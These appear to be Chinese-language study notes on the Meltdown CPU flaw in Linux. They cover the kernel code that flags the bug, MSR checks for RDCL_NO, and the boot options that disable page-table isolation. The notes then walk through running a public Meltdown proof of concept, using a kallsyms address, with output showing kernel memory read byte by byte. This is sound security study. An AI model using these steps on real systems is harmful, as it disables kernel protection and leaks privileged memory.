Meltdown.

只有在没有ARCH_CAP_RDCL_NO的时候才set这个bug.

1320 static void __init cpu_set_bug_bits(struct cpuinfo_x86 *c)
1321 {
... ...
1452         /* Rogue Data Cache Load? No! */
1453         if (x86_arch_cap_msr & ARCH_CAP_RDCL_NO)
1454                 return;
1455
1456         setup_force_cpu_bug(X86_BUG_CPU_MELTDOWN);


# cat /proc/cpuinfo | grep bug
bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa mmio_stale_data bhi ibpb_no_ret
bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa mmio_stale_data bhi ibpb_no_ret
bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa mmio_stale_data bhi ibpb_no_ret
bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa mmio_stale_data bhi ibpb_no_ret

ARCH_CAP_RDCL_NO可以通过MSR_IA32_ARCH_CAPABILITIES验证.

[root@desktop ~]# rdmsr 0x0000010a
c000048  --> ARCH_CAP_RDCL_NO not set

# rdmsr 0x0000010a
a06bdeb  --> ARCH_CAP_RDCL_NO is set

通过"mitigations=off"或者"pti=off"可以disable对Meltdown的保护.

[    0.006337] Kernel/User page tables isolation: disabled on command line.


# cat /sys/devices/system/cpu/vulnerabilities/meltdown
Mitigation: PTI

----------------------

可以使用这个POC:

https://github.com/isec-tugraz/meltdown

1. 添加"mitigations=off"或者"pti=off".

2. 获取地址.

# cat /proc/kallsyms | grep linux_proc_banner
ffffffff92a00160 D linux_proc_banner

3. 执行.

# ./meltdown ffffffff92a00160 14
cached = 35, uncached = 341, threshold 109
read ffffffff92a00160 = 25 % (score=984/1000)
read ffffffff92a00161 = 73 s (score=985/1000)
read ffffffff92a00162 = 20   (score=985/1000)
read ffffffff92a00163 = 76 v (score=986/1000)
read ffffffff92a00164 = 65 e (score=983/1000)
read ffffffff92a00165 = 72 r (score=985/1000)
read ffffffff92a00166 = 73 s (score=986/1000)
read ffffffff92a00167 = 69 i (score=986/1000)
read ffffffff92a00168 = 6f o (score=985/1000)
read ffffffff92a00169 = 6e n (score=984/1000)
read ffffffff92a0016a = 20   (score=978/1000)
read ffffffff92a0016b = 25 % (score=983/1000)
read ffffffff92a0016c = 73 s (score=983/1000)
read ffffffff92a0016d = 20   (score=983/1000)
read ffffffff92a0016e = 28 ( (score=985/1000)
read ffffffff92a0016f = 7a z (score=984/1000)
read ffffffff92a00170 = 68 h (score=983/1000)
read ffffffff92a00171 = 61 a (score=984/1000)
read ffffffff92a00172 = 6e n (score=985/1000)
read ffffffff92a00173 = 67 g (score=986/1000)
VULNERABLE
